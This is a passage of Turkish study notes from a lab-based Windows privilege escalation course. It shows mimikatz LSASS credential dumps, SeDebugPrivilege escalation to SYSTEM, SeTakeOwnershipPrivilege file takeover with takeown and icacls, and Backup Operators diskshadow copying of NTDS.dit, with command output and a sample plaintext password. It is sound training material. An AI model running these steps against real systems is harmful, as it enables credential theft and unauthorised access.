         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

<SNIP>
```

- **`log`**: Bu komut, yapılan işlemlerin log'lanması için `mimikatz.log` dosyasına tüm çıktıları kaydeder. Daha sonra analiz için çıktı dosyada saklanır.
    
- **`sekurlsa::minidump lsass.dmp`**: `sekurlsa` modülünde `minidump` komutuyla `lsass.dmp` adlı dump dosyasını yükleyerek analiz eder. Bu sayede LSASS process’inden elde edilen minidump dosyasındaki kimlik bilgilerini incelemek mümkün olur.
    
- **`sekurlsa::logonpasswords`**: Yüklenmiş dump dosyasından kullanıcı oturum bilgilerini ve kimlik doğrulama verilerini (`logon credentials`) çıkarmak için kullanılır. `mimikatz`, bu komutla oturum bilgilerini, kullanıcı adlarını, domain, NTLM ve SHA1 hash'lerini gösterir.

Herhangi bir nedenle hedefe araç yükleyemediğimizi ancak RDP erişimimiz olduğunu varsayalım. Bu durumda, `Details (Ayrıntılar` ) sekmesine göz atarak, `LSASS` prosesini seçerek ve `Create dump file (Döküm dosyası oluştur`) seçeneğini belirleyerek Görev Yöneticisi aracılığıyla `LSASS` prosesinin manuel bellek dökümünü alabiliriz. Bu dosyayı saldırı sistemimize geri indirdikten sonra, Mimikatz kullanarak önceki örnekle aynı şekilde işleyebiliriz.

![Pasted image 20241113150414.png](/img/user/resimler/Pasted%20image%2020241113150414.png)


## **SYSTEM olarak Remote Code Execution**

[RCE](https://decoder.cloud/2018/02/02/getting-system/) için `SeDebugPrivilege` 'dan da yararlanabiliriz. Bu tekniği kullanarak, bir [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes)başlatarak ve `SeDebugPrivilege` aracılığıyla hesabımıza verilen yükseltilmiş hakları kullanarak ayrıcalıklarımızı SYSTEM'e yükseltebilir ve normal sistem davranışını değiştirerek bir  [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads)'in token'ını devralabilir ve onu taklit edebiliriz. SYSTEM olarak çalışan bir parent process'i hedeflersek (hedef process'in veya çalışan programın Process ID'sini (veya PID'sini) belirterek), haklarımızı hızlı bir şekilde yükseltebiliriz. Bunu iş başında görelim.

İlk olarak, bu [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) hedef sisteme aktarın. Daha sonra scripti yükleyip aşağıdaki sözdizimiyle çalıştırıyoruz `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. PoC'un düzgün çalışması için sonuna üçüncü bir boş argüman `“”` eklememiz gerektiğini unutmayın.

PoC script bir güncelleme aldı. Lütfen GitHub deposunu ziyaret edin ve kullanımını inceleyin. https://github.com/decoder-it/psgetsystem

İlk olarak, yükseltilmiş bir PowerShell konsolu açın (sağ tıklayın, yönetici olarak çalıştırın ve `jordan` kullanıcısının kimlik bilgilerini yazın). Ardından, çalışan proseslerin ve beraberindeki PID'lerin bir listesini almak için `tasklist` yazın.

```powershell-session
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

Burada, Windows hostlarda SYSTEM olarak çalıştığını bildiğimiz PID 612 altında çalışan `winlogon.exe` 'yi hedefleyebiliriz.

![Pasted image 20241113151154.png](/img/user/resimler/Pasted%20image%2020241113151154.png)

Ayrıca [Get-Process](“https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2”) cmdlet'ini kullanarak SYSTEM olarak çalışan iyi bilinen bir process'in (LSASS gibi) PID'sini alabilir ve PID'yi doğrudan script'e aktararak gerekli adım sayısını azaltabiliriz.
![Pasted image 20241113151234.png](/img/user/resimler/Pasted%20image%2020241113151234.png)

[Bunun gibi diğer](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) araçlar, `SeDebugPrivilege`'a sahip olduğumuzda bir SYSTEM shell açmak için mevcuttur. Genellikle bir host'a RDP erişimimiz olmayacaktır, bu nedenle PoC'lerimizi saldırı host'umuza SYSTEM olarak bir reverse shell döndürecek şekilde ya da bir admin kullanıcısı eklemek gibi başka bir komutla değiştirmemiz gerekecektir. Bu PoC'lerle oynayın ve özellikle komut enjeksiyonu elde ettiğinizde veya `SeDebugPrivilege`'a sahip kullanıcı olarak bir web shell veya reverse shell bağlantısına sahip olduğunuzda olduğu gibi tamamen etkileşimli bir oturumunuz yoksa, SYSTEM erişimini başka hangi yollarla elde edebileceğinizi görün. LSASS dump'ının herhangi bir yararlı kimlik bilgisi sağlamadığı (sadece makine NTLM hash'i ile SYSTEM erişimi elde edebiliriz, ancak bu modülün kapsamı dışındadır) ve SYSTEM olarak bir shell veya RCE'nin faydalı olacağı bir durumla karşılaşmanız durumunda bu örnekleri aklınızda bulundurun.


Soru : SeDebugPrivilege haklarından yararlanın ve sccm_svc hesabı için NTLM parola hash'ini edinin.
Cevap : 




# SeTakeOwnershipPrivilege

[SeTakeOwnershipPrivilege](“https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects”), bir kullanıcıya Active Directory nesneleri, NTFS dosyaları/klasörleri, yazıcılar, kayıt defteri anahtarları, hizmetler ve prosesler gibi herhangi bir "güvenli nesnenin" sahipliğini alma yetkisi verir. Bu ayrıcalık, bir nesne üzerinde [WRITE_OWNER](“https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights”) hakları atar, yani kullanıcı nesnenin 'security descriptor' (güvenlik tanımlayıcısı) içindeki sahibini değiştirebilir. Yöneticilere varsayılan olarak bu ayrıcalık atanır. Bu ayrıcalığa sahip standart bir kullanıcı hesabıyla karşılaşmak nadir olsa da, örneğin yedekleme işlerini ve VSS anlık görüntülerini çalıştırmakla görevli bir servis hesabına bu ayrıcalığın atandığına rastlayabiliriz. Ayrıca, bu hesabın ayrıcalıklarını daha ayrıntılı bir düzeyde kontrol etmek ve hesaba full lokal yönetici hakları vermemek için `SeBackupPrivilege`, `SeRestorePrivilege` ve `SeSecurityPrivilege` gibi birkaç başka ayrıcalık daha atanabilir. Bu ayrıcalıklar kendi başlarına ayrıcalıkları yükseltmek için kullanılabilir. Yine de, diğer yöntemler engellendiği veya beklendiği gibi çalışmadığı için belirli dosyaların sahipliğini almamız gereken zamanlar olabilir. Bu ayrıcalığı kötüye kullanmak biraz uç bir durumdur. Yine de, özellikle Active Directory ortamında kendimizi bu hakkı kontrol edebileceğimiz belirli bir kullanıcıya atayabileceğimiz ve bir dosya paylaşımındaki hassas bir dosyayı okumak için kullanabileceğimiz bir senaryoda bulabileceğimiz için derinlemesine anlamaya değer.

![Pasted image 20241113223314.png](/img/user/resimler/Pasted%20image%2020241113223314.png)

Ayar, Group Policy altında ayarlanabilir:

- `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`


![Pasted image 20241113223338.png](/img/user/resimler/Pasted%20image%2020241113223338.png)

Bu ayrıcalıkla bir kullanıcı herhangi bir dosya veya nesnenin sahipliğini alabilir ve hassas verilere erişim, `Uzaktan Kod Yürütme` (`RCE`) veya `Hizmet Reddi` (DOS) içerebilecek değişiklikler yapabilir.

Bu ayrıcalığa sahip bir kullanıcıyla karşılaştığımızı veya [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) kullanarak GPO kötüye kullanımı gibi bir saldırı yoluyla bu ayrıcalığı onlara atadığımızı varsayalım. Bu durumda, bu ayrıcalığı paylaşılan bir klasörün veya parola içeren bir belge ya da SSH anahtarı gibi hassas dosyaların kontrolünü ele geçirmek için kullanabiliriz.

## **Ayrıcalıktan Yararlanma**


#### **Mevcut Kullanıcı Ayrıcalıklarını Gözden Geçirme**  

Mevcut kullanıcımızın ayrıcalıklarını gözden geçirelim.

```powershell-session
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

#### **SeTakeOwnershipPrivilege'ı Etkinleştirme**  

Çıktıdan ayrıcalığın etkinleştirilmediğine dikkat edin. [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog yazısında ayrıntılı olarak açıklanan bu [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) ve ilk konsepti temel alan [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) betiği kullanarak etkinleştirebiliriz.

```powershell-session
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

#### **Hedef Dosya Seçme**  

Ardından, bir hedef dosya seçin ve mevcut sahipliğini onaylayın. Bizim amaçlarımız doğrultusunda, bir dosya paylaşımında bulunan ilginç bir dosyayı hedef alacağız. Departmana göre ayarlanmış alt dizinleri olan `Public` ve `Private` dizinleri olan dosya paylaşımlarıyla karşılaşmak yaygındır. Bir kullanıcının şirketteki rolü göz önüne alındığında, genellikle belirli dosyalara / dizinlere erişebilirler. Böyle bir yapıda bile, bir sistem yöneticisi dizinler ve alt dizinlerdeki izinleri yanlış yapılandırabilir, bu da Active Directory kimlik bilgilerini edindikten sonra (ve hatta bazen kimlik bilgilerine ihtiyaç duymadan) dosya paylaşımlarını bizim için zengin bir bilgi kaynağı haline getirir. Senaryomuz için, hedef şirketin dosya paylaşımına erişimimiz olduğunu ve hem `Private` hem de `Public` alt dizinlerine serbestçe göz atabileceğimizi varsayalım. Çoğunlukla, izinlerin katı bir şekilde ayarlandığını ve dosya paylaşımının `Public` kısmında herhangi bir ilginç bilgi bulamadığımızı görüyoruz. `Private` kısmına göz atarken, tüm Domain Kullanıcılarının belirli alt dizinlerin içeriğini listeleyebildiğini ancak çoğu dosyanın içeriğini okumaya çalıştığında `Access denied` mesajı aldığını görüyoruz. Numaralandırma sırasında `Private` paylaşım klasörünün `IT` alt dizini altında `cred.txt` adlı bir dosya bulduk.

Kullanıcı hesabımızın `SeTakeOwnershipPrivilege` 'a sahip olduğu (bu ayrıcalık zaten verilmiş olabilir) veya kullanıcı hesabımıza bu ayrıcalığı vermek için aşırı izin veren bir Grup Politikası Nesnesi (GPO) gibi başka bir yanlış yapılandırmadan yararlandığımız göz önüne alındığında, istediğimiz herhangi bir dosyayı okumak için bundan yararlanabiliriz.  

Not: Dosya sahipliğini değiştirmek gibi potansiyel olarak yıkıcı bir eylem gerçekleştirirken, bir uygulamanın çalışmayı durdurmasına veya hedef nesnenin kullanıcılarının bozulmasına neden olabileceğinden çok dikkatli olun. Canlı bir web.config dosyası gibi önemli bir dosyanın sahipliğini değiştirmek, önce müşterimizden izin almadan yapacağımız bir şey değildir. Ayrıca, birkaç alt dizine gömülü bir dosyanın sahipliğini değiştirmek (aşağı inerken her bir alt dizin iznini değiştirirken) geri döndürülmesi zor olabilir ve bundan kaçınılmalıdır.

Hedef dosyamız hakkında biraz daha bilgi toplamak için dosyamıza göz atalım.

```powershell-session
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```


#### **Dosya Sahipliğini Kontrol Etme**  

Sahibin gösterilmediğini görebiliriz, bu da muhtemelen bu ayrıntıları görüntülemek için nesne üzerinde yeterli izne sahip olmadığımız anlamına gelir. Biraz geri gidebilir ve IT dizininin sahibini kontrol edebiliriz.

```powershell-session
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free
```

IT paylaşımının bir hizmet hesabına ait olduğunu ve içinde bazı veriler bulunan bir `cred.txt` dosyası içerdiğini görebiliriz.


#### **Dosyanın Sahipliğini Alma**  

Şimdi dosyanın sahipliğini değiştirmek için Windows [binary' sini](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) kullanabiliriz.

```powershell-session
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```


#### **Sahipliğin Değiştiğini Onaylama**  

Daha önce olduğu gibi aynı komutu kullanarak sahipliği onaylayabiliriz. Şimdi kullanıcı hesabımızın dosya sahibi olduğunu görüyoruz.

```powershell-session
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

#### **Dosya ACL'sini Değiştirme**  

Yine de dosyayı okuyamayabiliriz ve okuyabilmek için `icacls` kullanarak dosya ACL'sini değiştirmemiz gerekebilir.

```powershell-session
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

Kullanıcımıza hedef dosya üzerinde tam ayrıcalıklar verelim.

```powershell-session
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

- **icacls**: Windows’un dosya ve klasör erişim izinlerini yönetmek için kullanılan bir komuttur.
- **'C:\Your\Path\To\File.txt'**: İzinlerin uygulanacağı dosya veya klasörün tam yolu. Burada `C:\Your\Path\To\File.txt` olarak belirtilmiş, ancak gerçek senaryoda hedef dosya veya klasör yolu bu şekilde girilir.
- **/grant**: Bu parametre, bir kullanıcıya veya kullanıcı grubuna belirli izinleri vermek için kullanılır.
- **htb-student**: Bu, izin verilen kullanıcı veya kullanıcı grubudur. Burada örneğin “htb-student” adlı bir kullanıcıya erişim izni tanımlanıyor.
- : Bu kısımda, kullanıcıya verilen izin seviyesi belirtilir. `F`, tam denetim anlamına gelir (Full control). Tam denetim ile kullanıcı dosya üzerinde her türlü işlemi (okuma, yazma, değiştirme, silme vb.) yapabilir.

#### **Dosya Okuma**  

Her şey planlandığı gibi giderse, artık hedef dosyayı komut satırından okuyabilir, RDP erişimimiz varsa açabilir veya ek işlemler için saldırı sistemimize kopyalayabiliriz (örneğin bir KeePass veritabanının şifresini kırmak gibi).

```powershell-session
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
 
root:n1X_p0wer_us3er!
```

Bu değişiklikleri yaptıktan sonra, izinleri/dosya sahipliğini geri almak için her türlü çabayı göstermek isteriz. Herhangi bir nedenle bunu yapamazsak, müşterimizi uyarmalı ve değişiklikleri raporun bir ekinde dikkatlice belgelemeliyiz. Yine, bu izinden yararlanmak yıkıcı bir eylem olarak değerlendirilebilir ve büyük bir dikkatle yapılmalıdır. Bazı müşteriler, yanlış yapılandırmanın kanıtı olarak eylemi gerçekleştirme becerisini belgelememizi, ancak potansiyel etki nedeniyle kusurdan tam olarak yararlanmamamızı tercih edebilir.

## **Ne Zaman Kullanılmalı?**  

#### **İlgi Çekici Dosyalar**  

İlginizi çekebilecek bazı yerel dosyalar şunları içerebilir:

```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

Ayrıca `.kdbx` KeePass veritabanı dosyaları, OneNote not defterleri, `passwords.*`, pass. `*`, `creds` `.` `*` gibi dosyalar, komut dosyaları, diğer yapılandırma dosyaları, virtual hard drive dosyaları ve ayrıcalıklarımızı yükseltmek ve erişimimizi artırmak için hassas bilgileri çıkarmayı hedefleyebileceğimiz daha fazlasıyla karşılaşabiliriz.


Soru : “C:\TakeOwn\flag.txt” adresinde bulunan dosya üzerinde SeTakeOwnPrivilege haklarından yararlanın ve içeriği gönderin.
Cevap : 

![Pasted image 20241113230125.png](/img/user/resimler/Pasted%20image%2020241113230125.png)


![Pasted image 20241113230403.png](/img/user/resimler/Pasted%20image%2020241113230403.png)

![Pasted image 20241113230507.png](/img/user/resimler/Pasted%20image%2020241113230507.png)

![Pasted image 20241113230939.png](/img/user/resimler/Pasted%20image%2020241113230939.png)



# Windows Group Privileges

## **Windows Built-in Groups**  

`Windows Ayrıcalıklarına Genel Bakış` bölümünde belirtildiği gibi, Windows sunucuları ve özellikle Domain Controller'lar, işletim sistemiyle birlikte gelen veya bir sunucuyu Domain Controller'a yükseltmek için Active Directory Domain Services rolü bir sisteme yüklendiğinde eklenen çeşitli built-in gruplara sahiptir. Bu grupların çoğu üyelerine özel ayrıcalıklar verir ve bazıları bir sunucu veya Domain Controller üzerindeki ayrıcalıkları artırmak için kullanılabilir. [Burada](https://ss64.com/nt/syntax-security_groups.html) tüm yerleşik Windows gruplarının bir listesi ve her birinin ayrıntılı bir açıklaması bulunmaktadır. Bu [sayfada](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) Active Directory'deki ayrıcalıklı hesapların ve grupların ayrıntılı bir listesi bulunmaktadır. Bu gruplardan birine üye olan bir hesaba erişim elde ettiğimizde ya da bir değerlendirme sırasında bu gruplardan birine ya da daha fazlasına aşırı/gereksiz üyelik fark ettiğimizde, bu grupların her birine üyeliğin sonuçlarını anlamak önemlidir. Amaçlarımız doğrultusunda, aşağıdaki yerleşik gruplara odaklanacağız. Bu grupların her biri, Hyper-V Yöneticileri (Server 2012 ile tanıtılmıştır) hariç, Server 2008 R2'den günümüze kadar olan sistemlerde mevcuttur.

En az ayrıcalığı uygulamak ve yedekleme gibi belirli görevleri gerçekleştirmek için daha fazla Domain Admins ve Enterprise Admins oluşturmaktan kaçınmak için hesaplar bu gruplara atanabilir. Bazen satıcı uygulamaları da bu gruplardan birine bir hizmet hesabı atayarak verilebilecek belirli ayrıcalıklar gerektirir. Hesaplar kazara veya belirli bir araç ya da komut dosyası test edildikten sonra da eklenebilir. Bu grupları her zaman kontrol etmeli ve her grubun üyelerinin bir listesini, müşterinin incelemesi ve erişimin hala gerekli olup olmadığını belirlemesi için raporumuza ek olarak eklemeliyiz.

| [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)            | [Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) | [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|                                                                                                                                                                           |                                                                                                                                                                 |                                                                                                                                                                |
| [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators) | [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)    | [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) |

## **Backup Operators**

Bir makineye girdikten sonra, mevcut grup üyeliklerimizi göstermek için `whoami /groups` komutunu kullanabiliriz. `Backup Operators` grubunun üyesi olduğumuz durumu inceleyelim. Bu grubun üyeliği, üyelerine `SeBackup` ve `SeRestore` ayrıcalıklarını verir. [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges)herhangi bir klasörde gezinmemizi ve klasör içeriğini listelememizi sağlar. Bu, klasörün erişim denetimi listesinde (ACL) bizim için bir erişim denetimi girdisi (ACE) olmasa bile, bir klasörden dosya kopyalamamıza izin verecektir. Ancak, bunu standart kopyala komutunu kullanarak yapamayız. Bunun yerine, [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) bayrağını belirttiğimizden emin olarak verileri programlı bir şekilde kopyalamamız gerekir.

Bu [PoC](https://github.com/giuliano108/SeBackupPrivilege) 'yi `SeBackupPrivilege`'dan yararlanmak ve bu dosyayı kopyalamak için kullanabiliriz. İlk olarak, kütüphaneleri bir PowerShell oturumunda içe aktaralım.

#### Importing Libraries

```powershell-session
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

#### **SeBackupPrivilege'ın Etkinleştirildiğini Doğrulama**  

`Whoami /priv` veya `Get-SeBackupPrivilege` cmdlet'ini çağırarak `SeBackupPrivilege` 'ın etkin olup olmadığını kontrol edelim. Ayrıcalık devre dışı bırakılmışsa, `Set-SeBackupPrivilege` ile etkinleştirebiliriz.

Not: Sunucunun ayarlarına bağlı olarak, UAC'yi atlamak ve bu ayrıcalığa sahip olmak için yükseltilmiş bir CMD istemi oluşturmak gerekebilir.

```powershell-session
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```powershell-session
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```

#### **SeBackupPrivilege'ı Etkinleştirme**  

Ayrıcalık devre dışı bırakılmışsa, `Set-SeBackupPrivilege` ile etkinleştirebiliriz.

```powershell-session
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

```powershell-session
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

#### **Korumalı Bir Dosyayı Kopyalama**  

Yukarıda gördüğümüz gibi, ayrıcalık başarıyla etkinleştirildi. Bu ayrıcalık artık herhangi bir korumalı dosyayı kopyalamak için kullanılabilir.

```powershell-session
PS C:\htb> dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt


PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes


PS C:\htb>  cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:

<...SNIP...>
```

Yukarıdaki komutlar, gerekli izinlere sahip olmadan hassas bilgilere nasıl erişildiğini göstermektedir.


#### **Domain Controller'a Saldırma - NTDS.dit'i Kopyalama**

Bu grup ayrıca bir domain controller'da local olarak oturum açmaya da izin verir. Active Directory veritabanı `NTDS.dit`, domain'deki tüm kullanıcı ve bilgisayar nesneleri için NTLM hash'lerini içerdiğinden çok çekici bir hedeftir `.` Ancak bu dosya kilitlidir ve ayrıcalıklı olmayan kullanıcılar tarafından da erişilemez.  

`NTDS.dit` dosyası varsayılan olarak kilitli olduğundan, `C` sürücüsünün gölge kopyasını oluşturmak ve `E` sürücüsü olarak göstermek için Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) yardımcı programını kullanabiliriz. Bu gölge kopyadaki NTDS.dit sistem tarafından kullanılmayacaktır.

```powershell-session
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

### **Neden Yeni Bir Disk Oluşturuluyor?**

Windows’un **NTDS.dit** dosyası, sistem tarafından aktif olarak kullanıldığından, bu dosyaya doğrudan erişim mümkün değildir. Ancak, **shadow copy** (gölgeleme kopyası) oluşturulması ile bu dosyanın bir kopyası alınabilir ve aktif sistem tarafından kilitli olmadan erişilebilir. **E:** sürücüsü, bu amaçla oluşturulmuş geçici bir kopya sürücüsüdür ve üzerinde NTDS.dit dosyasına erişim sağlanabilir. Bu sayede, canlı dosya sistemi değiştirilmeden veya engellenmeden NTDS.dit gibi hassas dosyalara ulaşılabilir.

### **Adım 1: diskshadow.exe'yi Başlatma**

Bu adımda, `diskshadow.exe` komutunu çalıştırarak Windows’un shadow copy (gölgeleme kopyası) aracı başlatılır. Shadow copy oluşturulması için bu araca ihtiyaç vardır. Bu araç, sistemdeki dosyaların kopyalarını almak için kullanılır.

### **Adım 2: Verbose Modunu Etkinleştirme**

`set verbose on` komutu, shadow copy işlemi sırasında daha ayrıntılı çıktılar almak için kullanılır. Bu, işlemin her aşamasında sistemin ne yaptığını görmek için faydalıdır.

### **Adım 3: Meta Veri Dosyasını Belirleme**

`set metadata C:\Windows\Temp\meta.cab` komutu, shadow copy işlemi için kullanılacak olan meta veri dosyasının konumunu belirtir. Meta veri dosyası, shadow copy işlemi sırasında kopyalanan dosyaların bilgilerini tutar ve bu dosya işlem tamamlandıktan sonra silinir.

### **Adım 4: İstemciye Erişim İzni Verme**

`set context clientaccessible` komutu, shadow copy'ye dışarıdan erişim izni verir. Bu, shadow copy'nin sadece yerel bilgisayarda değil, diğer istemciler tarafından da erişilebilir olmasını sağlar.

### **Adım 5: Kalıcı Yapma**

`set context persistent` komutu, shadow copy’nin kalıcı olmasını sağlar. Normalde shadow copy'ler belirli bir süre sonra silinir, ancak bu komut ile gölge kopya sürekli olarak erişilebilir hale gelir.

### **Adım 6: Yedeklemeyi Başlatma**

`begin backup` komutu, shadow copy oluşturma işleminin başladığını belirtir. Bu komut çalıştırıldıktan sonra sistem C: sürücüsünün kopyasını oluşturacaktır.

### **Adım 7: Hedef Sürücüyü Belirleme**

`add volume C: alias cdrive` komutu, C: sürücüsünün shadow copy’sinin oluşturulacağını belirten bir komuttur. Bu sürücünün kopyası alınacaktır.

### **Adım 8: Shadow Copy Oluşturma**

`create` komutu, belirtilen C: sürücüsünün shadow copy’sini oluşturur. Bu adım, dosyaların kopyalanmasını sağlar.

### **Adım 9: Shadow Copy'yi Yeni Bir Sürücüde Gösterme**

